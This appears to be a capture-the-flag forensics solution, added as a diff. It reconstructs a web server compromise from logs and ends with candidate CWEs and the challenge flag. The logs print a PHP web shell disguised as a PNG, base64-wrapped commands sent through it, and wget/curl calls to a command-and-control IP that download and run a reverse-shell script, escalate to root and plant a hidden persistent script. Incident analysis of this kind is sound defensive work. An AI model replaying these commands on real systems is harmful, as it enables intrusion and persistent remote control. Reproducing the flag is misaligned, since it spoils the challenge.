@@ -1,0 +1,93 @@
+==============================
+IP Attaquant:
+C2
+163.172.67.201:49999
+==============================
+
+00:29:17.292 2025-03-28
+/admin-page/manage.php?success=true&path=upload/68af9111db3749e2e8af39e255fd874c/ev1L.php.png
+
+00:29:31.653 2025-03-28
+/admin-page/upload/68af9111db3749e2e8af39e255fd874c/ev1L.php.png?cmd=echo%20%27bHMgLWxhIA==%27|base64%20-d|sh
+base64decode = "ls -la"
+
+00:29:57.114 2025-03-28 (dsystem)
+whoami
+
+00:29:57.116 2025-03-28 (web)
+/admin-page/upload/68af9111db3749e2e8af39e255fd874c/ev1L.php.png?cmd=echo+'d2hvYW1p'|base64+-d|sh
+base64decode = "whoami"
+
+00:31:01.683 2025-03-28 (web)
+/admin-page/upload/68af9111db3749e2e8af39e255fd874c/ev1L.php.png?cmd=echo+'cHdk'|base64+-d|sh
+base64decode = "pwd"
+
+00:31:15.675 2025-03-28 (web)
+"request": "/admin-page/upload/68af9111db3749e2e8af39e255fd874c/ev1L.php.png?cmd=echo+'cGluZyAtYyAxIGdvb2dsZS5jb20='|base64+-d|sh"
+base64decode = "ping -c 1 google.com"
+
+00:31:40.526 2025-03-28 (web)
+"request": "/admin-page/upload/68af9111db3749e2e8af39e255fd874c/ev1L.php.png?cmd=echo+'cGluZyAtYyAxIGdvb2dsZS5jb20='|base64+-d|sh"
+base64decode = "ping -c 1 google.com"
+
+00:31:50.518 2025-03-28 (web)
+"request": "/admin-page/upload/68af9111db3749e2e8af39e255fd874c/ev1L.php.png?cmd=echo+'Y3VybCBodHRwOi8vMTYzLjE3Mi42Ny4yMDE6NDk5OTkv'|base64+-d|sh"
+base64decode = "curl http://163.172.67.201:49999/"
+
+00:32:16.735 2025-03-28 (web)
+"request": "/admin-page/upload/68af9111db3749e2e8af39e255fd874c/ev1L.php.png?cmd=echo+'d2dldCBodHRwOi8vMTYzLjE3Mi42Ny4yMDE6NDk5OTkvczFtcGwzLXIzdnNoM2xsLXZwcy5zaA=='|base64+-d|sh"
+base64decode = "wget http://163.172.67.201:49999/s1mpl3-r3vsh3ll-vps.sh"
+
+00:32:37.505 2025-03-28 (web)
+"request": "/admin-page/upload/68af9111db3749e2e8af39e255fd874c/ev1L.php.png?cmd=echo+'Y2htb2QgK3ggczFtcGwzLXIzdnNoM2xsLXZwcy5zaA=='|base64+-d|sh"
+base64decode = "chmod +x s1mpl3-r3vsh3ll-vps.sh"
+
+00:33:00.652 2025-03-28
+sh -c echo 'Li9zMW1wbDMtcjN2c2gzbGwtdnBzLnNo'|base64 -d|sh
+base64decode = "./s1mpl3-r3vsh3ll-vps.sh"
+
+00:36:37.744 2025-03-28
+sudo su root
+
+00:36:57.908 2025-03-28
+mkdir -p /root/.0x00
+
+00:37:34.938 2025-03-28 (dsystem)
+wget http://163.172.67.201:49999/s1mpl3-r3vsh3l.sh -O /root/.0x00/pwn3d-by-nullv4stati0n.sh
+
+00:38:07.427 2025-03-28
+chmod +x /root/.0x00/pwn3d-by-nullv4stati0n.sh
+
+00:39:01.989 2025-03-28
+/bin/bash /root/.0x00/pwn3d-by-nullv4stati0n.sh
+
+00:42:01.115 2025-03-28 (dsystem)
+/bin/sh -c /root/.0x00/pwn3d-by-nullv4stati0n.sh
+
+00:43:01.134 2025-03-28
+/bin/bash /root/.0x00/pwn3d-by-nullv4stati0n.sh
+
+00:43:01.133 2025-03-28
+/bin/bash /root/.0x00/pwn3d-by-nullv4stati0n.sh
+
+00:43:01.132 2025-03-28
+/bin/sh -c /root/.0x00/pwn3d-by-nullv4stati0n.sh
+
+==============================
+
+CWE Candidats
+
+CWE-434: Unrestricted Upload of File with Dangerous Type - https://cwe.mitre.org/data/definitions/434.html
+CWE-521: CWE-521: Weak Password Requirements - https://cwe.mitre.org/data/definitions/521.html
+CWE-269: CWE-269: Improper Privilege Management - https://cwe.mitre.org/data/definitions/269.html
+CWE-250: Execution with Unnecessary Privileges - https://cwe.mitre.org/data/definitions/250.html
+CWE-669: Incorrect Resource Transfer Between Spheres - https://cwe.mitre.org/data/definitions/669.html
+CWE-116: Improper Encoding or Escaping of Output - https://cwe.mitre.org/data/definitions/116.html
+CWE-94: Improper Control of Generation of Code ('Code Injection') - https://cwe.mitre.org/data/definitions/94.html
+CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection') - https://cwe.mitre.org/data/definitions/78.html
+CWE-98: Improper Control of Filename for Include/Require Statement in PHP Program ('PHP Remote File Inclusion') - https://cwe.mitre.org/data/definitions/98.html
+
+Flag : RM{CWE-98:CWE-434:163.172.67.201:/root/.0x00/pwn3d-by-nullv4stati0n.sh}
+
+
+==============================
